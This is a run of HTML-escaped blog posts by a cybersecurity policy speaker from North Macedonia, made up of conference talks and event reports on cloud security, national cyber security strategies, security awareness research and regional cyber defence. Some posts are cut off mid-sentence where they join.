First I would like to thank to the organizers for second time invitation of Economic Forum, in a such beautiful mountain view and spa centers.&lt;/p&gt;
&lt;p&gt;Second, I would like to give you a short introduction of myself. I’m repressing today a NGO as a co-founder of Internet Governance Forum from North Macedonia. I have worked in cybersecurity for more than 12 years in several different industries, startups and international organizations, such as: DiploFoundation, OSCE, OECD, NATO and so on. A part from working experience, also I have graduated master studies in Cyber Security from Estonia, and post-master studies in Security in Computer Systems and Communications from France. Needlessly to say, today I work in cloud security and I’m based in Berlin, Germany. &lt;/p&gt;
&lt;p&gt;I’m here to discuss a topic that recent years it has brought an attention. The constant development of new technologies is accelerating, and the range of digital solutions is continuing to grow. The risk associated with ICT has become increasingly clear in recent years due to a number of incidents. Thus the advent of cloud services, mobile and ICT - based products always brings in a new vulnerabilities. Over the coming years, the digital transformation of both public and private sectors will continue. The development of new technologies will accelerate, and the range of digital solutions will continue to grow.&lt;/p&gt;
&lt;p&gt;For this reason, my speech today will be organized as follows:
- What is digital transformation and why is becoming more popular.
- What are the Challenges and threats in Cloud Computing.
- Which EU member states have addressed a digital transformation and/or cloud computing into their National Cyber Security Strategies.
- What are the best practices and recommendation.
- And finally I will conclude.&lt;/p&gt;
&lt;p&gt;But before I start, I would like to share with you what do we mean by digital transformation. We have heard this terminology couple of time here at other panels at 29th Economic Forum. &lt;/p&gt;
&lt;p&gt;And it is a usage of new, fast and often changing digital technology to solve problems by utilizing cloud computing. But then you might ask yourself why switching from already existing infrastructure to something into “cloud”? There are several reasons for this and bear with me I would only highlight the most important once. That is reducing costs, on-demand self-services, flexibility, rapid elasticity and scalability. And now I might lost you with my nerd language. Let me put it into a simple words:
- Resources are available from anywhere over the network.
- Computing resources available on-demand and self-service, by requesting only as you needed basis.
- You pay only for what you use or reserve.
- You can scale cloud resources - up and down.&lt;/p&gt;
&lt;p&gt;To be able to use all above reasons to switch into cloud, you need to know what kind of cloud computing models you need. And there are several: Private, Community, Public and Hybrid Cloud. I would come back to this models later on a speech.&lt;/p&gt;
&lt;p&gt;Due to the popularity of - digital transformation, that is cloud computing, several organizations that I have worked had migrated their infrastructure into “cloud”, in industries as financial, transport, health, national, tourism, and digital identities providers. And always before the migration starts is the question are we cloud ready. Among ISMS and Data Protection, GDPR and many requirements, there are few other important things to care about security in cloud. Those things are: set of policies, controls, procedures and technologies that work together to protect cloud based systems, and of course data and infrastructure.&lt;/p&gt;
&lt;p&gt;But then few of you might say, hey is in that ISMS, standards, frameworks, regulations and requirements for? You might answer YES, but unfortunately NOT.&lt;/p&gt;
&lt;p&gt;I would share with you a real example. In one of the financial industry where I was working  they have implemented all the security and policy standards, frameworks and requirements. However, when the process of migrating into cloud started we have noticed that their existing security controls, policies and procedures are not cloud ready. The controls have been written 10 or maybe 15 years ago, and indeed they have protected the financial company from attacks and threats within on-prem infrastructure. However, after kick off the digital transformation plan we come to conclusion that if we migrate to cloud computing, half or even more than a half of the controls are no longer applicable. Therefore, we had to review and adjust the controls to meet the security requirements and cloud readiness. And frankly speaking, this might sound very simple task on one hand, but on the other hand it is not.&lt;/p&gt;
&lt;p&gt;As development of new technologies is accelerating, the services are growing as well. Subsequently, future developments in cyber security are hard to predict. However, clear vision of the challenges which is influenced by digital transformation are:
Everything is connected to the Internet - IoT
Amount of data in digital form is only increasing
Shared responsibilities, between state, private companies and cloud service providers
The increased complexity and dependence on ICT-based products and services require a higher lever of expertise&lt;/p&gt;
&lt;p&gt;In past two year few EU countries have updated their National Cyber Security Strategies. This updates are not only to bring better and more secure cyber space in the state but also to adjust to a new technology trends. That said, first country that has taken into account digital transformation and cloud computing is &lt;a href="https://www.enisa.europa.eu/topics/national-cyber-security-strategies/ncss-map/strategies/national-cyber-security-strategy-1/@@download_version/82b3c1a34de449f48cef8534b513caea/file_en"&gt;Dutch National Cyber Security Strategy&lt;/a&gt; updated in April 2018. Followed by &lt;a href="https://www.enisa.europa.eu/topics/national-cyber-security-strategies/ncss-map/strategies/national-strategy-for-cyber-and-information-security/@@download_version/8b31862c3e304fceadc0719d18dc3bb3/file_en"&gt;Danish Cyber and Information Security Strategy&lt;/a&gt; also last year in May. And lastly this year in April &lt;a href="https://www.enisa.europa.eu/topics/national-cyber-security-strategies/ncss-map/strategies/the-national-security-strategy/@@download_version/eb07526e232f4095a00bae0335c9cb02/file_en"&gt;Spanish National Cyber Security Strategy&lt;/a&gt;. Due to the time limitations I would not be able to go through each one of them into details.&lt;/p&gt;
&lt;p&gt;Furthermore, I would share few recommendations taken from mentioned National Cyber Security Strategies and from my experience.
That are:
- Strengthened cyber and information security efforts in the business community.
- Special attention should be paid to protecting technological inherence and industrial and intellectual property.
- Make the most of digital transformation opportunities, by using hybrid cloud model - combined with public and private cloud.&lt;/p&gt;
&lt;p&gt;Last but not least I would like to summarize. Public authorities and businesses have a fundamental responsibility to ensure that security continue the development and digital transformation of the government and private sector towards the required level of security. The goal should be to strengthen trust in the Internet, digital transformation and development of new technologies, helping to build a secure ecosystem that boosts progress of cyber resilience, capacities and cyber security culture in the direction to single digital market. Therefore, if some states are in the process of drafting new version of National Cyber Security Strategies, within join efforts please make sure that you integrate and initiate cloud readiness and digital transformation goals in the strategy.&lt;/p&gt;</content><category term="pages"></category><category term="cyber security"></category><category term="IT security"></category><category term="cloud security"></category><category term="strategy"></category><category term="CII"></category><category term="infrastructure"></category><category term="industry"></category><category term="keynote"></category><category term="key speech"></category><category term="presentation"></category><category term="conference"></category><category term="national cyber security strategy"></category><category term="digital transformation"></category><category term="migration"></category></entry><entry><title>Cyber Security Challenges for 2018</title><link href="https://predragtasevski.com/posts/2017/03/IT-security-2018-challenges/" rel="alternate"></link><published>2017-03-27T00:00:00+02:00</published><updated>2017-03-27T00:00:00+02:00</updated><author><name>Predrag TASEVSKI - Pece</name></author><id>tag:predragtasevski.com,2017-03-27:/posts/2017/03/IT-security-2018-challenges/</id><summary type="html">&lt;p&gt;Cold March and cold Struga, I had an opportunity to present a talk at Second Regional Internet Freedom Summit, organized by American Bar Association Rule of Law Initiative's (ABA ROLI'S) on a topic: Development and Enhancement of Legal Frameworks in Eastern Europe and Eurasia to Protect Internet Freedom Program.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;My name is Predrag Tasevski and I’m an independent cyber security researcher from Macedonia.&lt;/p&gt;
&lt;p&gt;When we talk about Balkan region it is actually neither one step further nor one step backwards regarding cyber threats and cyber security. And at the same time progression of ICT is improving the  connectivity and its utilities from the rest of the world. For this reason discussing about cyber defense and security capacity in the region is in fact crucial and important topic.
However before we continue we have to understand the difference between IT security and cyber security. IT security is to protect business and individual assets, whereas cyber security it involved IT security as well as national, state security and security of Critical Information Infrastructure point of view.
To be able to have safer cyber space, we need to take an actions. Such as, ratifying conventions for instance Budapest Convention, moreover, adapting legal framework with international and of course social society needs. Than pursue establishment of National Bodies that will deal with occurrence and the frequency of cyberspace attacks and threats. And last but not least, develop national cyber security strategy. Among the mentioned actions, also important is to take into consideration the general approaches, as multi stakeholders and multi-level approach.
Cyberspace could not be 100% secured, therefore each country should introduce national cyber security culture and at the same time raising the awareness level to the weakest link in cyber security - that is the human behaviors.
Moreover, when we discuss about the cyber security and defense another important questions should be raised, by providing of course and answers:
Who? determines the target of who you are planning to secure.
What? determines the content of what to secure.
How? is the means by how you are going to secure it.&lt;/p&gt;
&lt;p&gt;Turning back to Balkan vision toward cyber defense and security, we might say that several countries a much further progressing, such as Slovenia, Croatia, Albania, Montenegro and Bosnia &amp;amp; Herzegovina, in contrast to slowly progressing countries: Macedonia, Serbia and etc.
Nevertheless, the region has taken under the umbrella and understood the importance of such topics and for this reason are taking hence actions. Such actions are as we mentioned previously making their legal framework compliance with the international perspectives. And establishing national bodies to react and countermeasure the incident occurred in cyberspace. And finally establishing national cyber security strategy.&lt;/p&gt;
&lt;p&gt;And in the end I would like to provide recommendation actions that could help other countries in pursuing and capacity building towards cyber defense and security.
Such as:
1. Understand cyber defense from a global perspective, don't feel nervous and foolish when it comes to the word “Cyber”. Use common and simple language that everyone could understand it.
2. Define and implement a national cyber security/defence strategy, followed by cyber security frameworks by supporting it initiatives and international cooperation.
3. Develop public awareness, cyber security culture and education that will touch entire population needs.
4. Improve resilience against cyber terrorism, cyber espionage, hybrid war and cyber warfare by sharing knowledge, documents, continues education and training, military and non-military capabilities.
5. Enforcing ICT infrastructures security in order to obtain confidence and security in the use of ICT. By investing in research and development.
6. And finally, continuance of public meetings and networking are in fact needed and essential on yearly basis for secure cyber space.&lt;/p&gt;
&lt;p&gt;“The first step toward encouraging security and defence is awareness, followed by the implementation, acceptance and so forth”&lt;/p&gt;

&lt;p&gt;December was a last month of 2013, and for sure the best month. Not
because of the parties, holidays and vacation that they were coming. But
it is because I was selected in a final round of &lt;a href="http://academy.kaspersky.com/cybersecurity/european-round-2014/"&gt;Kaspersky Academy

2014&lt;/a&gt;
in Milan, Italy. The conference was a part of &lt;a href="http://academy.kaspersky.com/cybersecurity/"&gt;CyberSecurity for the
Next Generation&lt;/a&gt; events
that are happening all over the world. The event took place in 11 until
13 of December 2013, in beautiful and unfortunate at that time foggy
city Milan, and hosted at Politecnico di Milano. Nevertheless, we had a
wonderful time. Before I continue with the presentation of my research
paper I would like to thanks the organizers for such a great
organization and full and frankly not that busy and indeed interesting
agenda. Nice work guys, love you and of course miss you.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Turning to research paper that I presented, "Methodological approach to
security awareness", the presentation is available below as well as my presentation notes.
Without any further ado I will let the notes to speak for themself, as
well as the presentation and the pictures. Hope that you enjoy the
reading.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;/p&gt;

&lt;p&gt;Ladies and gentlemen, dear committee, my name is Predrag Tasevski from
Macedonia and currently I’m a post-master student in Eurecom, France.
Today I will present you my research study Methodological approach to
security awareness. But before we start I would like to share a short
story.&lt;/p&gt;
&lt;p&gt;Previously I was studying MSc in Cyber security in Estonia. When I was
in the middle of the studies, in the 2011, it was one year after
finished the first year. I went home for the Christmas holidays. At
that time I was curious in opening a company in Macedonia. And for
this reason I went to Central register office.&lt;/p&gt;
&lt;p&gt;When I reached the room number 10 I knocked on the door. Once, two,
three times, and still there was no answer. I push the door and I
entered in empty room full of 6 computers. I shouted few times,
however there was no answer.&lt;/p&gt;
&lt;p&gt;So I started to watch the screens. Unlikely from Estonia, frankly in
Macedonia people love paper-work. Indeed, in the bureaus there where
open documents and the computer’s ware unlocked. Usually, I always I
have with me an external hard drive…&lt;/p&gt;
&lt;p&gt;Then the good side and bad side of me come out .…&lt;/p&gt;
&lt;p&gt;It took me a few minutes to decide,… and likely the good side of me
won. After 30 minutes I was able to get the answers.&lt;/p&gt;
&lt;p&gt;Let us just stop for a second and thing what I could do with this data
…. Could you imagine how reach I would be nowadays if I backup the
data…&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;While I was on the way back home, I started to think why people are so
careless about the information. In reality it just takes one second to
lock the computer. Why people coupled with human factor are actually
the weakest link in security? And therefore for this reason, we
introduce you this study.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Today we will discuss the problem statement and related work. Coupled
with the current awareness level. Secondly, methods and approached
that we have introduced in this study and the curriculum. Last but not
least, we will present the results of the syllabus as a consequence of
the implementation in schools, universities, private and public
organizations. And finally we will conclude.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Numerous amounts of awareness programs exist in the last 20 years.
However their approaches and methods are different. Up to now almost
all the academic effort in information security training has
concentrated on solving the technical and policy aspects, rather than
designing security systems to take into account the human factor. The
human factor is being the most vulnerable threat in the system, and it
could jeopardize the overall efficiency of the organization and
nation. Lastly, few of them have the questionnaire quizzes
implemented.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The ideas for the awareness program we have implemented are usually
not new, but the uniqueness of our awareness program lies in the style
of communication, the systematic approach of the targeted groups and
the content delivered. Other unique factors are the baseline survey
and questionnaire quiz, and lastly the topic adviser. We believe that
no other previously related work as mention in this study has used
such systematic approach, methods and targeted groups.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;There are three systematical target groups in the syllabus: basic,
advance and management. Each part contains certain number of modules,
divided into units, which are pursued into separate curriculum. In
fact the idea of the target groups is to elevate the awareness level
of three different types of groups of information security. We
emphasize that the weakest element is human behavior, followed by the
socio-technical aspect. Please bear in mind, that this syllabus does
not cover the legal aspects.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The study provided the entrance for participants only with the Basic
curriculum. The focus is to examine the response of the prior concern
about safety and knowledge of protection of IT assets compared to the
scores earned. In total we had around 1000 participants, from 11 to 63
years old and around 700 of them where male and the rest female. Most
of the them use the computers either at home or work. In the content
of how they want to get education about the IT security is that around
430 answered through Online training. Turning to the current awareness
level before they entered the course is in fact that only 400 of them
were somewhat knowledgeable of how to secure their assets. Also
another interesting fact is that a greater number of the participants
are least concerned about protecting their mobile devices.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In comparison with the current awareness level we also demonstrate the
average percentage score gained in each unit. Subsequently it allows
us to pin-point modules which participants are more and less
knowledgeable. So as to take tailored measurements for future actions.
For instance Network &amp;amp; Internet Security is the most knowledgeable,
rather than Physical security.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally, the threats to cybersecurity are constantly evolving. Thus we
need to ensure that not only the specialist who are protecting IT
systems get a proper awareness education, but also the basic, everyday
users and managers should too. Every manager can be a user, but every
user can not be a manager.&lt;/p&gt;
&lt;p&gt;Thereby, only significant changes in user perception, culture and
education can effectively reduce the number of information and
cybersecurity breaches. Consequently this will raise the awareness
level of the human factor in using technologies in everyday life.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The strength of our study lies in the results and evidence of
implemented syllabus and it improve everyday work and usage of
technologies.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;We believe that this approach could be implemented effectively in
private, public, military, nations, etc. without a significant
degradation in performance.&lt;/p&gt;
&lt;p&gt;As well as future studies should examine broader views on policy and
legal aspects.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/p&gt;

&lt;p&gt;Although I did not win, however let me just remind the others that we
are all winners. There were around 60 papers submitted and only 15 were
selected for finale round. We should be proud of our self. And of course
each one of us did a perfect job in presenting own work. Hope that you
all will continue in this path, as well as to see you soon. Friendship
and networking that we had there is my gift from others and Kaspersky.
Thank you once again. Congrats to the winners. Here is a short note from
Kaspersky about the conference, &lt;a href="http://academy.kaspersky.com/cybersecurity-in-milano/" title="CyberSecurity in Milan - Kaspersky"&gt;CyberSecurity in

this year the weather surprised all the participants of &lt;a href="http://www.stockholminternetforum.se/" title="Stockholm Internet Forum 2014"&gt;Stockholm
Internet Forum
2014&lt;/a&gt;.
Although it is one of the most beautiful cities in Europe, it was even
more with rising sun every day. Especially coming from Nice where the
weather was under storm, and sunny and long days in Stockholm were
unforgettable. Before I continue with description and the nature of this
year SIF, first would like to apologize for late post – I was under busy
with examination, second would like to thank the organization for
selecting me as a valuable participant.&lt;span id="more-1158"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Being in Stockholm for the second time it is a privilege. And indeed,
this year SIF surprised me with the invitation. Usually the organizers
are selecting each year new participant. From their explanation only 10%
of previous year participants are invited where the rest are new.
Consequently, there were around 450 participants, from different
countries in this year SIF14. Nonetheless, it was an event for great
opportunities for networking and meeting interesting people, or see the
rear ones from the previous year.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Speaking of which the event and the panel discussions I might say that
I’m a bit disappointed, because of the repeating of the participant from
SIF13. Another point that I would like to stress out regarding the event
is that in this event the participants are not only a hacktivists,
policy makers, whistleblowers, activities, NGO, etc., but also companies
and so forth. I love the idea of selecting for each panel to have one
enterprise represent, however bear in mind that people will might
exploit this and take and pursue a totally different aspect of the
discussion. Therefore, I suggest for the organization to select wisely
the enterprise panelists. For instance, make sure that the topic and the
theme of the panels are emphasized and understood by the wide audience,
as well as that the chair man and the panelists will control the floor
and that the topic will not go outside of content. This is due to this
event, some panel discussions were totally misunderstood by the audience
and indeed some participants were frustrated, for instance me, but also
many others.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Furthermore, coming back to the selection of percentage of the
participant. I frankly love the idea that you like to bring different
audience and different people each year event, however in my opinion and
as well as from other that we discussed during the event is that will be
much better that from the 10% is either 15-20%. This is due to fact that
most if the time these topics and events only and usually bring new
topics and questions, and not give answers to them. So in this respect
you will have a continuing discussions and most probably some answers,
coupled with outcome.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Also I would like to take an opportunity to respond to the participant
that were emphasizing the participation of one of the hot topic and
indeed well known person, today – Edward Snowden. In respect to their
request where is Snowden and so on, I would like to point out few
things: first in international law it is firstly impossible to bring him
in Sweden because of his status in Russia; moreover there is no need for
him to take participation in the event where we talk about freedom of
Internet, as well as the espionage, privacy, policy, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To sum, again thanks to the organization for inviting me once again to
the event. Second, by taking into account the above suggestions,
personally thing that the event will be more progressive, as well as
proactive by having outcome. Further, bring people, panelists which are
wisely selected compliance to the topic and theme of the event and/or
discussion. In the end, looking forward seeing you in the next year, as
well hope that I will be taking place this time as one of panelist.
Where not only that I could contribute with the discussion but also
bring some new important questions in the podium.&lt;/p&gt;
&lt;/p&gt;

days in camp with young, smart, enthusiast, academical, non-academical,
scholars, military, history critics and politicians in a venue in wild
beauty of Montenegro, near the Plavsko lake in Plav. The location of the
camp was in a such a beautiful area. My eyes could not stop looking for
something, such as either it was the top of the mountain, or the Plavsko
lake, or even the green hills and valleys.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Anyhow, let me return to the main point here. Firstly I will like to
share a couple of history background of &lt;a href="http://www.reactmontenegro.me/"&gt;Regional Euro Atlantic Camp
REACT&lt;/a&gt;, organized by &lt;a href="http://www.alfacentar.org/"&gt;ALFA Center
Montenegro&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;First REACT camp took place in 2008, since then it takes place every
year, until now six years. The best and intriguing part of this camp is
that each year the venue of the event is in different place, therefore
the participants have a change to meet the beauty of Montenegro. The
idea in behalf of the organizers is very good, and I do support them in
this matter. Sometimes Montenegro routs could be a very heavy for the
drivers, however still this beauty should be exposed to the rest of the
world. Additionally, each year the number of participants varies
depending on the applications. However, this year there where
participants from 25 different countries, which make is in total 75
participants from elsewhere, such as, Balkans countries, Ex-Soviet Union
countries, Hungary, Slovakia, Czech Republic and many others.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Turning to the
&lt;a href="http://www.reactmontenegro.me/agenda/agenda.html"&gt;agenda&lt;/a&gt; of REACT
2013, it was quite densely deployed, with lectures, panel discussions,
etc. Although it was heavy still the best side was the picnic adventures
and cultural evenings. Please feel free to see the pictures below of the
post.&lt;/p&gt;
&lt;p&gt;Secondly, I would like to take a time to concentrate more on the issue
of cyber security. During the event the
&lt;a href="http://www.reactmontenegro.me/agenda/list-of-speakers.html"&gt;speakers&lt;/a&gt;
where representative of governments from sixteen countries, as well as
NGOs, media, students, researchers, among the others. Mostly, the topics
where concentrating on intention to see the pros and cons of join to
NATO, where indeed the countries from this region have in mind. However,
when it comes to the goals of NATO, and new threats, such as cyber
threats, cyber crime coupled with strategies, framework and so on, only
one speaker it emphasized the importance of cyber security as one of the
greatest risk now a day and in future, of course. I will not delay too
much, as you might all unravel it was the USA Deputy Chief of Mission in
Montenegro, Mr. Jones. Mr. Jones was very precise in his speech,
moreover he mentioned the importance of infrastructure as well as the
stability and security in Balkan region. I would like to cite one of the
lectures, Mr. Petric he said “Together we are stronger!”. How the days
go by, I was just wondering and always trying to ask questions about the
cyber security, and the importance of this issue, however, most of the
speakers where no that specialized or somehow not interested of in fact
important unit of integration requirements in NATO.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Additionally, I was a moderator to a topic Kosovo open or close? The
question was which topics, fields are close or open, regarding the
Kosovo as a new country in the region.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In short summary, please feel free to see the pictures below and I hope
that in future to REACT Camp we will have much more discussions and
panels and topics about the new threats that we are facing. Likewise, I
always say, no matter how much we pour money in infrastructure and
security, still the weakest chain will be the human factor, because it
is not a aware of the importance of cyber security. Consequently, we
will have to keep in mind that this issue and importance of cyber
security is in benefits to wide security, economy and political aspects,
by process of joining and integrating the region to the path of NATO.&lt;/p&gt;

administration of Belgrade Security Forum, within goal of inviting me to
be a speaker in one of the break out sessions. In particular the session
topic is: &lt;strong&gt;Assuring Cyber-Security in the Western Balkans and the Rest
of Europe.&lt;/strong&gt; And of course, I have accepted the invitation. Speak of
which, the &lt;em&gt;Belgrade Security Forum&lt;/em&gt; has been in past few years. This –
2013 year was the third in the row event. And with it, we have continue
the talk from the previous year session about cyber security: &lt;a href="http://2012.belgradeforum.org/agenda/session3.html%20&amp;quot;Belgrade%20Security%20Forum%202012"&gt;Cyber War
and Cyber Crime: Responding to the Governance
Challenges&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Turning to this year session, we had a very good chance to boost the
enthusiasm from other panel discussion where chairman – Richard Thomson
called me in between the discussion of Helsinki Plus 40: Strengthening
the Security Community to Meet Current Security Challenges. Where he
raise the issue of what and if it is possible with one click that
someone could stop the energy, power supply or even telecommunication
systems. And, my answer was very straightforward, indeed it is! This was
a very good spur of inspiration of our breakout session.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Together with other speaker we came to conclusion that the best way to
go ahead and to have an effective discussion is to open the most
important questions relating to cyber security: &lt;strong&gt;Who? What? and How?&lt;/strong&gt;
But before further to the answers the above question, I would like also
to mention that the speakers where kind of divided, in a good sense
where we came from different regions as well as specialized fields in
cyber security. In details, &lt;strong&gt;Baroness Pauline Neville-Jones&lt;/strong&gt; was in
related fields in government issues and challenges in cyber security.
Where on other hand, I was a representative from the Wester Balkan
region representative. Furthermore, &lt;strong&gt;Alexander Klimburg&lt;/strong&gt; was more
concentrating of different stakeholder, in other words multi
stakeholders approach. Where last but not least, &lt;strong&gt;Jovan Kurbalija&lt;/strong&gt; was
in diplomacy, civil society and information technology. And finally, the
moderator of the session was &lt;strong&gt;Vladimir Radunović&lt;/strong&gt;, who manage to
create a nice vibe between the speakers and the audience from the
beginning until the end of the session. For more details of the session
please follow the Breakout session report: &lt;a href="http://belgradeforum.org/info/news/459/Session+7%3A+Assuring+Cyber-Security+in+the+Western+Balkans+and+the+Rest+of+Europe.html" title="Session 7: Assuring Cyber-Security in the Western Balkans and the Rest of Europe"&gt;Session 7: Assuring
Cyber-Security in the Western Balkans and the Rest of
Europe&lt;/a&gt;.
For more information of the issues that we follow and given answers are
available on the
&lt;a href="http://www.belgradeforum.org/agenda/sesija5.html" title="Agenda"&gt;Agenda&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;From left to right: Vladimir Radunović, Predrag Tasevski, Jovan
Kurbalija, Alexander Klimburg and Baroness Pauline Neville-Jones&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Also I would like to make some quick notes on the main cyber threats and
possible effects that are linked to Western Balkan region. The most
known and presented cyber threats are among the cybercrime. For instance
in one hand are: employee fraud, minor and child pornography; using of
mobile telephones and smartphones as tools to commit other crime;
identity theft and credit card fraud. Where on the other hand are among
the political, moral, ethical and other motivation reasons. Such as,
web-based attacks, mostly committed by defacement or denial-of-service
attacks. Then we have phising and spoofing social networking sites.
Where the possible effects are for instance for individuals loss of
money, and of course political or ethical doctrine. Moreover, awareness
of roles and responsibilities of different actors, such as government,
regulators, industry and civil society of risk are taken into
consideration only the implementation of law. For instance, data
protection law and so on. Turning to the industry and civil society is
almost the same, although some of them are implementing the very known
standards, such as ISO 27001 and so on. However, is this enough? The
roles and responsibilities are only described in the data protection law
and criminal law. Unfortunately, it is not carried out by the framework
or even a strategy. Likelihood, awareness level in Western Balkans
presented by my paper back book that I have conducted last year,
&lt;a href="http://www.amazon.com/Interactive-Cyber-Security-Awareness-Program/dp/3659207985/ref=sr_1_1?s=books&amp;amp;ie=UTF8&amp;amp;qid=1367779682&amp;amp;sr=1-1&amp;amp;keywords=Interactive+Cyber+Security+Awareness+Program" title="Interactive Cyber Security Awareness Program"&gt;Interactive Cyber Security Awareness Program Cyber Security Awareness
Program&lt;/a&gt;.
This book outlines the survey done around 1000 participants, from 11 to
63 years old. In diversity of carries, such as schools, universities,
private and public organizations. In total we had 35% people using
computers/internet from home and 26% from office. In particular and most
interesting figures for us are results about the knowledge of protecting
their IT assets, and in details: 16% are very knowledgeable, least
knowledgeable are 13% and last but not least somewhat knowledgeable are
40%. Therefore from the results presented we can see that awareness
level among the end users is vary. Coming to the end, if we want to make
sure the involvement of end users in raising trust and securing the
cyberspace we firstly have to start from strategy, than legal framework,
followed by implementation, and so on. However, when it comes to step to
get done by governments should be as follows:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Develop and create strategy framework for Cyber-security, in
    particular, not to cover the area only of cyber crime, but also how
    to mitigate happened incidents.&lt;/li&gt;
&lt;li&gt;Rewrite and review the cyber crime law and data protection law.&lt;/li&gt;
&lt;li&gt;Create NGO or NPO that will deal not only for a concrete country but
    of course the entire region, as well.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;In the end I have noted that some countries in Wester Balkans do not
have &lt;strong&gt;yet&lt;/strong&gt; either, CERT – Critical Emergency Response Team nor CIRT –
Critical Incident Response Team. Therefore, this action should be taken
as soon as possible.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In summary, hope that the above notes will take effect, as well as will
raise the awareness of the important in fact issue. Therefore we have to
be simple and follow just simple three steps:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Strategical plan which will aim in business continuity.&lt;/li&gt;
&lt;li&gt;Partnership between Groups, such as government, private and civil.
    As well as to provide awareness on the share bases.&lt;/li&gt;
&lt;li&gt;Education the public, where we need to take an action of
    re-informing the school materials, and to provide the young
    generations guide of how to protect in cyber space and skills.&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Thank you to the participant, speakers, guest, organizers and everyone
for such a lovely stay in Belgrade.&lt;/p&gt;

beforehand prepared scenarios.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The agenda of the course was as below:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Cyber security vs. IT security&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Types of attacks&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Types of vulnerabilities&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Types of exploitation&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Work-shop: Red, White and Blue teams&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;The attendance to the course was 20 people, which in fact surprises me
in a very good way. The group was with various of majors, for instance
from the youngest elementary school, students in engineering to IT
specialises in financial sector, as well as future start-ups
e-commerce/e-shops companies.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Turning to a near future we will prepare a courses with more in-depth
work-shops and more technical. Likewise, getting hands dirty, by
hacking, attacking virtual machines, as well as performing
countermeasures. Throughout virtualiazed environment attacks and
exploitations, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Hopefully that the above course has raised the awareness level of IT
security importance.&lt;/p&gt;

can You catch me…”, aimed at introducing the possibilities of hacking
social networks sites, how you can find and discover burglar and how to
protect yourself in the future. The training was held on May 10 at 13:30
pm in the amphitheater of TMF. The training was free and open to all
interested. Trainers of this training were: &lt;a href="http://predragtasevski.com/" title="Predrag Tasevski"&gt;Predrag
Tasevski&lt;/a&gt; founder
&lt;a href="http://www.cybersecurity.mk/" title="CyberSecurity.mk"&gt;CyberSecurity.mk&lt;/a&gt; and
Katerina Jovanovska head of Department of Information and criminal
investigations in the area of criminal technique in Ministry of
Interiors in Macedonia.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, during the presentation I have introduce the participant how
easy and simple is to pass the second verification of Trusted contacts
in Facebook. For more information please refer to the next paragraph the
presentation. Due to the copyrights and leaking of information I’m
unable to share the presentation of Department of information and
criminal investigation in Macedonia. Thank you for your understanding.
Also many thanks to the Deputy Minister of Information Society and
Administration, Marta Arsovska Tomovska for wonderful introduction and
being present to the training.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Also the purpose of this training was to boost the awareness and of
course interest to the students for future training that will be
provided by
&lt;a href="http://www.cybersecurity.mk/" title="CyberSecurity.mk"&gt;CyberSecurity.mk&lt;/a&gt; and

Not only in Europe, but also in South-East European region as well. The
following international event was organized
by &lt;a href="http://www.paneuropa.bg/" title="PanEuropa Bulgaria"&gt;PanEuropa Bulgaria&lt;/a&gt; and
it was supported by NATO. Furthermore, I was invited to take a
participation as a speaker on the panel discussion Collective Cyber
Defence – The Role of Newer Members and Opportunities for Specialization
of Bulgaria in the Alliance Questions and answers. In details, the event
main points ware to highlight the need for specialization of each member
state in terms of the principles of Smart Defense and the joint
participation in future military operations.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, the event had splendid video addressing in the opening session
of Neelie Kroes, the Vice – President of European Commission.
Emphasizing the current online spying crisis as well as the importance
of cyber security strategy. In additional, she highlighted the
importance of new legal threats, information norms coupled to boost the
trust among the Europe. As well as, that the weakest link in the chain
should be able to raise and boost the awareness, coupled with the future
investments in research and innovations, and projects.&lt;/p&gt;
&lt;/p&gt;

